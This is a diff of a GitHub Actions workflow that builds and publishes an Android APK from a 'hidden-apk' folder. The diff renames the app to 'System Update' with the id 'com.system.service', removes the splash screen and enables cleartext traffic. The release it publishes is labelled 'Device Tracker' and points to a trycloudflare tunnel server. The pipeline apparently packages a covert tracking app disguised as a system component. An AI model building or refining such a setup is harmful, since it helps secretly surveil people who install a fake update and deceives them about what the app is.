@@ -23,47 +23,39 @@ jobs:
     - name: Install dependencies
       run: |
         npm install
-        npm install -g @capacitor/cli @capacitor/core
+        npm install -g @capacitor/cli @capacitor/core @capacitor/android
     
     - name: Create www directory
-      run: |
-        mkdir -p www
+      run: mkdir -p www
     
-    - name: Copy web files to www
+    - name: Copy hidden-apk files
       run: |
         if [ -d "hidden-apk" ] && [ -f "hidden-apk/index.html" ]; then
           cp -r hidden-apk/* www/
-          echo "✅ Files copied to www/"
+          echo "✅ Files copied"
           ls -la www/
         else
           echo "❌ hidden-apk/index.html not found!"
-          echo "Creating dummy index.html..."
-          echo '<!DOCTYPE html><html><head><title>Hidden</title></head><body><h1>Hidden App</h1></body></html>' > www/index.html
+          exit 1
         fi
     
     - name: Create Capacitor config
       run: |
-        cat > capacitor.config.json << EOF
+        cat > capacitor.config.json << 'EOF'
         {
           "appId": "com.system.service",
           "appName": "System Update",
           "webDir": "www",
-          "plugins": {
-            "SplashScreen": { "launchShowDuration": 0 }
-          }
+          "plugins": { "SplashScreen": { "launchShowDuration": 0 }},
+          "server": { "androidScheme": "https", "cleartext": true }
         }
         EOF
-        echo "✅ capacitor.config.json created"
-        cat capacitor.config.json
     
     - name: Add Android platform
-      run: |
-        npx cap add android || echo "Android platform already exists"
+      run: npx cap add android || echo "Platform exists"
     
     - name: Sync Capacitor
-      run: |
-        npx cap sync android
-        echo "✅ Sync completed"
+      run: npx cap sync android
     
     - name: Build APK
       run: |
@@ -71,7 +63,6 @@ jobs:
         chmod +x gradlew
         ./gradlew assembleDebug
         echo "✅ APK built"
-        ls -la app/build/outputs/apk/debug/
     
     - name: Upload APK
       uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882
@@ -86,11 +77,6 @@ jobs:
         files: android/app/build/outputs/apk/debug/app-debug.apk
         tag_name: v${{ github.run_number }}
         name: Hidden APK v${{ github.run_number }}
-        body: |
-          ## تحديث تلقائي
-          - التاريخ: ${{ github.event.head_commit.message }}
-          - البناء رقم: ${{ github.run_number }}
-        draft: false
-        prerelease: false
+        body: "## Device Tracker\n\nBuild #${{ github.run_number }}\n\nServer: assign-place-picture-recommendation.trycloudflare.com"
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
